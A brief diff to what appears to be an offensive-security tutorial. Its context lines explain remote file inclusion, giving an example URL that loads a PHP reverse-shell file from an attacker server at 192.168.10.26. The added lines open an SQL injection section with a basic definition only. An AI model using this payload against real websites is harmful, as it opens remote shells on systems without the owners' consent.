@@ -525,3 +525,7 @@ server to the target.
 
 For this to work, make a php file that gives you a reverse connection to the target and save it as `.txt`. Then put 
 this on you server, copy the link to the file and paste in the string like so `https://website.com/upload/?page=http://192.168.10.26/php-reverse.txt?`
+
+### SQL Injection
+
+SQL is the programming language for relational databases. A database is where data is stored, like username, emails and passwords.
